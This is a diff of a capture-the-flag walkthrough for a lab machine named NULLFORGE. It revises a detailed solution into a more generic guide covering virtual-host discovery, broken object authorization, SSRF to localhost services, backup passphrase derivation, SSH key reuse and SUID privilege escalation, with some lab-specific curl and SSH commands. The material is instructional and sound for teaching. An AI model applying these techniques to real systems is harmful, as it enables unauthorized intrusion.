@@ -805,359 +1222,506 @@ cat /root/root.txt
 THM{NULLFORGE::10::****}
 ```
 
-You have completed the intended NULLFORGE attack chain.
+NULLFORGE is now complete.
 
 ---
 
-# 22. Complete Attack Chain
+# 6. Full Discovery Chain
 
-For a quick review, the full path is:
+The intended path can be summarized without exposing the room's answers:
 
 ```text
-[1] Scan target
-     |
-     v
-[2] Public HTTP application
-     |
-     v
-[3] Discover useful endpoints
-     |
-     v
-[4] Enumerate virtual hosts
-     |
-     v
-[5] console.nullforge.internal
-     |
-     v
-[6] Visible deployment: NF-2026-041
-     |
-     v
-[7] Broken object authorization
-     |
-     v
-[8] Hidden deployment: NF-2026-042
-     |
-     v
-[9] Internal Operations API
-     |
-     v
-[10] SSRF via /fetch?url=
-     |
-     v
-[11] Operations registry
-     |
-     +-----------------------+
-     |                       |
-     v                       v
-[12] Forge :8082          Backup :9090
-     |                       |
-     v                       v
-[13] Backup workflow       Encrypted archive
-     |                       |
-     +-----------+-----------+
-                 |
-                 v
-[14] Backup policy
-                 |
-                 v
-[15] Derive passphrase
-                 |
-                 v
-[16] Decrypt archive
-                 |
-                 v
-[17] Recover SSH key
-                 |
-                 v
-[18] SSH as ops
-                 |
-                 v
-[19] Enumerate systemd timer
-                 |
-                 v
-[20] Writable maintenance configuration
-                 |
-                 v
-[21] Root-controlled hook
-                 |
-                 v
-[22] SUID helper
-                 |
-                 v
-[23] root
-                 |
-                 v
-[24] /root/root.txt
+[01] Enumerate external services
+          |
+          v
+[02] Read the public application
+          |
+          v
+[03] Follow application-referenced resources
+          |
+          v
+[04] Discover a second virtual host
+          |
+          v
+[05] Inspect its deployment API
+          |
+          v
+[06] Extract a related object identifier
+          |
+          v
+[07] Test object-level authorization
+          |
+          v
+[08] Recover an internal localhost service
+          |
+          v
+[09] Locate the public server's remote-fetch feature
+          |
+          v
+[10] Confirm SSRF
+          |
+          v
+[11] Enumerate the internal service registry
+          |
+          +----------------------+
+          |                      |
+          v                      v
+[12] Internal app A          Internal app B
+          |                      |
+          v                      v
+[13] Backup workflow       Backup records
+          |                      |
+          +----------+-----------+
+                     |
+                     v
+[14] Retrieve encrypted artifact
+                     |
+                     v
+[15] Locate encryption policy
+                     |
+                     v
+[16] Recover derivation inputs
+                     |
+                     v
+[17] Reconstruct passphrase
+                     |
+                     v
+[18] Decrypt archive
+                     |
+                     v
+[19] Discover private key
+                     |
+                     v
+[20] SSH foothold
+                     |
+                     v
+[21] Enumerate local groups
+                     |
+                     v
+[22] Enumerate systemd timers
+                     |
+                     v
+[23] Trace privileged service
+                     |
+                     v
+[24] Trace referenced configuration
+                     |
+                     v
+[25] Identify writable trust boundary
+                     |
+                     v
+[26] Follow privileged hook
+                     |
+                     v
+[27] Discover SUID helper
+                     |
+                     v
+[28] root
 ```
 
 ---
 
-# 23. Flag Progression
+# 7. Flag Progression
 
-| Flag | Where it is discovered | Main skill |
+| Flag | Discovery milestone | Primary skill |
 |---|---|---|
-| 01 | Public application manifest | Web enumeration |
-| 02 | Deployment console | API enumeration |
-| 03 | Unauthorized deployment record | Broken object authorization |
-| 04 | Operations diagnostics | SSRF / internal API discovery |
-| 05 | Internal Forge | Internal service enumeration |
-| 06 | Backup service | SSRF / backup enumeration |
-| 07 | Decrypted backup archive | Cryptographic reasoning |
-| 08 | `ops` account | SSH key recovery |
+| 01 | Public application artifact | Web reconnaissance |
+| 02 | First deployment object | API enumeration |
+| 03 | Related unauthorized object | Broken object authorization |
+| 04 | Internal diagnostics | SSRF / internal API discovery |
+| 05 | Internal artifact metadata | Service enumeration |
+| 06 | Backup metadata | Backup discovery |
+| 07 | Decrypted archive | Cryptographic reasoning |
+| 08 | SSH foothold | Credential recovery |
 | 09 | Maintenance stage | Local privilege escalation |
-| 10 | `/root/root.txt` | Root access |
+| 10 | Root stage | Privilege escalation |
 
 ---
 
-# 24. Why the Chain Works
+# 8. Why the Attack Chain Works
 
-NULLFORGE is intentionally built as a sequence of trust failures.
+NULLFORGE is built around a sequence of trust failures.
 
-### External trust
+### Trust Boundary 1 — Public Information
 
-The public application exposes information that should help an attacker understand the environment.
-
-### Virtual-host trust
-
-A separate deployment console is available through a hidden Host-header route.
-
-### Authorization trust
-
-Deployment objects can be accessed without correctly validating whether the requesting user is authorized to view them.
-
-### Request-routing trust
-
-The public server can be abused to make requests to services bound only to localhost.
-
-### Service trust
-
-Internal services expose additional operational information and backup infrastructure.
-
-### Backup trust
-
-The backup system reveals enough metadata to reconstruct its passphrase.
-
-### Credential trust
-
-The recovered backup contains a private SSH key.
-
-### Local configuration trust
-
-A root-controlled maintenance service consumes configuration writable by a member of a low-privileged group.
-
-### Execution trust
-
-The maintenance workflow causes a helper to become SUID, providing the final privilege boundary bypass.
-
-The challenge therefore moves from:
+The public application exposes information useful to an attacker.
 
 ```text
-information disclosure
+public web response
+        ↓
+application structure
 ```
 
-to:
+### Trust Boundary 2 — Hidden Web Surface
+
+A separate application can be reached through virtual-host routing.
 
 ```text
-authorization failure
+Host header
+     ↓
+different application
 ```
 
-to:
+### Trust Boundary 3 — Object Authorization
+
+An object identifier is treated as sufficient to retrieve an object.
 
 ```text
-server-side request forgery
+object ID
+   ↓
+missing authorization check
+   ↓
+other record
 ```
 
-to:
+### Trust Boundary 4 — Server-Side Requests
+
+A remote-fetch feature allows the public server to reach localhost.
 
 ```text
-credential recovery
+attacker
+   ↓
+web server
+   ↓
+localhost service
 ```
 
-to:
+### Trust Boundary 5 — Internal Service Discovery
+
+Internal services expose enough metadata to map the next layers.
 
 ```text
-local privilege escalation
+registry
+   ↓
+applications
+   ↓
+backup infrastructure
 ```
 
-rather than depending on a single one-shot exploit.
+### Trust Boundary 6 — Backup Design
+
+The backup passphrase is deterministic and its inputs are discoverable.
+
+```text
+metadata
+   ↓
+key derivation rule
+   ↓
+archive password
+```
+
+### Trust Boundary 7 — Historical Credentials
+
+The backup contains a private credential that can authenticate to the target.
+
+```text
+backup
+   ↓
+private key
+   ↓
+user shell
+```
+
+### Trust Boundary 8 — Privileged Configuration
+
+A root maintenance service consumes configuration writable by a low-privileged group.
+
+```text
+low privilege
+      ↓
+writable config
+      ↓
+root service
+```
+
+### Trust Boundary 9 — Privileged Execution
+
+The maintenance workflow changes a helper's permissions, creating a root execution path.
+
+```text
+root service
+    ↓
+hook
+    ↓
+SUID helper
+    ↓
+root
+```
+
+The room therefore teaches chaining rather than relying on one isolated vulnerability.
 
 ---
 
-# 25. Troubleshooting
+# 9. Troubleshooting by Evidence
 
-## The Host-header scan shows every candidate
+## The virtual-host scan returns too many results
 
-The default application response can produce a common response size.
-
-Use the size filter demonstrated in the intended enumeration:
+First establish the normal/default response:
 
 ```bash
+curl -i http://MACHINE_IP/
+```
+
+Then compare:
+
+```text
+status code
+content length
+title
+headers
+body
+```
+
+Use the stable default response as the baseline for your ffuf filter.
+
+For this room, the original enumeration used:
+
+```text
 -fs 1609
 ```
 
-If the returned default size differs in your environment, identify the common baseline response first and filter that instead of blindly copying the number.
+If your environment produces a different baseline, measure it rather than blindly copying the number.
 
 ---
 
-## `console.nullforge.internal` does not resolve
+## The discovered hostname does not resolve
 
-Add the room's target IP to `/etc/hosts`:
+Add the exact hostname you discovered:
 
 ```bash
-echo "MACHINE_IP console.nullforge.internal" | sudo tee -a /etc/hosts
+echo "MACHINE_IP <DISCOVERED_HOSTNAME>" \
+  | sudo tee -a /etc/hosts
 ```
 
-Then test:
+Test:
 
 ```bash
-curl -i http://console.nullforge.internal/
+curl -i http://<DISCOVERED_HOSTNAME>/
 ```
 
 ---
 
-## The internal API is unreachable directly
+## The internal service cannot be reached directly
 
 That is expected.
 
-The Operations API is intended to be reached through the public application's SSRF functionality:
+Remember:
 
 ```text
-/fetch?url=
+127.0.0.1
 ```
+
+refers to the machine making the request.
+
+Use the vulnerable server-side request feature rather than your workstation's loopback interface.
 
 ---
 
-## The encrypted archive does not decrypt
+## The SSRF request fails
 
-Check the backup policy again:
+Validate in layers:
 
-```bash
-curl -s \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/repositories/ops-backup-config/files/backup-policy.json"
+```text
+1. Can the public site be reached?
+2. Is the fetch feature present?
+3. Does a simple URL fetch work?
+4. Does localhost respond?
+5. Does the internal service's health endpoint respond?
+6. Does the diagnostic endpoint respond?
 ```
+
+Do not jump directly to a complex API path before validating the primitive itself.
+
+---
+
+## The archive does not decrypt
+
+Return to the encryption policy.
 
 Verify:
 
-- AES-256-CBC
-- PBKDF2
-- iteration count
-- passphrase construction rule
-- commit value
-- backup job start time
-
-Do not add extra separators unless the documented rule requires them.
-
----
-
-## SSH rejects the private key
-
-Ensure the extracted private key has restrictive permissions:
-
-```bash
-chmod 600 /tmp/nullforge-backup/home/ops/.ssh/id_ed25519
+```text
+cipher
+KDF
+iteration count
+latest commit value
+job start time
+concatenation order
 ```
 
-Then connect again:
-
-```bash
-ssh \
-  -i /tmp/nullforge-backup/home/ops/.ssh/id_ed25519 \
-  ops@MACHINE_IP
-```
-
----
-
-## The SUID helper is not SUID yet
-
-The intended path requires the maintenance process to run.
-
-Check the timer:
-
-```bash
-systemctl list-timers --all | grep nullforge
-```
-
-Then inspect the helper:
-
-```bash
-ls -l /usr/local/libexec/nullforge-report
-```
-
-The expected post-maintenance state includes:
+The intended construction is:
 
 ```text
--rwsr-xr-x
+<latest_commit><job_start_hhmm>
+```
+
+Do not add separators unless the discovered policy explicitly requires them.
+
+---
+
+## The private key is rejected
+
+Check:
+
+```bash
+chmod 600 <DISCOVERED_PRIVATE_KEY>
+```
+
+Then verify that the recovered file is actually a private key:
+
+```bash
+file <DISCOVERED_PRIVATE_KEY>
+```
+
+You can also inspect only its first line:
+
+```bash
+head -n 1 <DISCOVERED_PRIVATE_KEY>
 ```
 
 ---
 
-# 26. Intended Learning Outcomes
+## The maintenance stage does not appear to work
 
-By the end of NULLFORGE, the player should have practiced:
+Start with the timer:
 
-- External service enumeration
-- Web application reconnaissance
-- Virtual-host discovery
-- API enumeration
-- Broken object-level authorization / IDOR
-- SSRF identification and exploitation
-- Internal service discovery
-- Backup and artifact enumeration
-- Reading application configuration
-- Deterministic secret derivation
-- OpenSSL archive decryption
-- SSH private-key recovery
-- Linux identity and group enumeration
-- systemd timer/service inspection
-- Writable privileged configuration analysis
-- SUID privilege escalation
+```bash
+systemctl list-timers --all
+```
+
+Then inspect the service:
+
+```bash
+systemctl cat <DISCOVERED_SERVICE_UNIT>
+```
+
+Then inspect:
+
+```text
+User=
+EnvironmentFile=
+ExecStart=
+```
+
+Finally inspect the referenced configuration and hook.
+
+Work from the evidence chain instead of jumping directly to the helper.
 
 ---
 
-# 27. Final Notes for Players
+# 10. Professional Enumeration Mindset
 
-The room is intended to reward **reading and correlation**.
-
-Several important clues are not hidden behind complicated exploitation. They are exposed through:
+When approaching NULLFORGE, use this loop repeatedly:
 
 ```text
-HTTP responses
-JSON records
-service registries
-backup policy
-systemd configuration
-file permissions
+OBSERVE
+   ↓
+What changed?
+   ↓
+IDENTIFY
+   ↓
+What component controls that?
+   ↓
+TEST
+   ↓
+Can I reproduce it?
+   ↓
+DOCUMENT
+   ↓
+What new information did I gain?
+   ↓
+PIVOT
 ```
 
-When you discover a new piece of infrastructure, ask:
+For every new discovery ask:
 
 ```text
-What does this service know?
-What other service does it reference?
+What does this component know?
+
 What does it trust?
-Who can modify that trust relationship?
-What does the next layer expose?
+
+What can I change?
+
+What does it reference?
+
+Who executes it?
+
+What is listening behind it?
 ```
 
-That mindset is the core of NULLFORGE.
+Those questions are more valuable than any individual command.
 
 ---
 
-## Completion Checklist
+# 11. Intended Learning Outcomes
 
-You have completed the intended path when you can account for all ten milestones:
+By completing NULLFORGE, the player practices:
 
 ```text
-[ ] Flag 01 — Public manifest
-[ ] Flag 02 — Deployment console
-[ ] Flag 03 — Hidden deployment
-[ ] Flag 04 — Operations API
-[ ] Flag 05 — Internal Forge
-[ ] Flag 06 — Backup service
-[ ] Flag 07 — Encrypted backup
-[ ] Flag 08 — ops foothold
-[ ] Flag 09 — Maintenance privilege stage
-[ ] Flag 10 — root
+✓ External service enumeration
+✓ Web reconnaissance
+✓ Virtual-host discovery
+✓ API enumeration
+✓ Broken object-level authorization
+✓ SSRF identification and exploitation
+✓ Internal service discovery
+✓ Artifact and backup enumeration
+✓ Configuration analysis
+✓ Deterministic secret derivation
+✓ OpenSSL archive decryption
+✓ SSH private-key recovery
+✓ Linux group enumeration
+✓ systemd timer/service analysis
+✓ Writable privileged configuration discovery
+✓ Trusted hook analysis
+✓ SUID privilege escalation
 ```
+
+---
+
+# 12. Completion Checklist
+
+A complete solution should account for all ten milestones:
+
+```text
+[ ] 01 — Public application discovery
+[ ] 02 — Deployment object discovery
+[ ] 03 — Unauthorized related object
+[ ] 04 — Internal diagnostic service
+[ ] 05 — Internal artifact metadata
+[ ] 06 — Backup service
+[ ] 07 — Decrypted archive
+[ ] 08 — SSH foothold
+[ ] 09 — Maintenance privilege stage
+[ ] 10 — Root
+```
+
+---
+
+# 13. Final Takeaway
+
+NULLFORGE is intentionally designed so that the next layer is normally visible inside the current layer.
+
+The most important habit is therefore:
+
+> **Do not ask only "what can I exploit?" Ask "what did I just discover, and what does it point to?"**
+
+The public application points toward the hidden application.
+
+The hidden application points toward an internal service.
+
+The internal service points toward the backup system.
+
+The backup system points toward a credential.
+
+The credential points toward the local account.
+
+The local account points toward the maintenance system.
+
+The maintenance system points toward the privileged helper.
+
+The privileged helper points toward root.
+
+That is the intended NULLFORGE path.
 
 **NULLFORGE complete.**
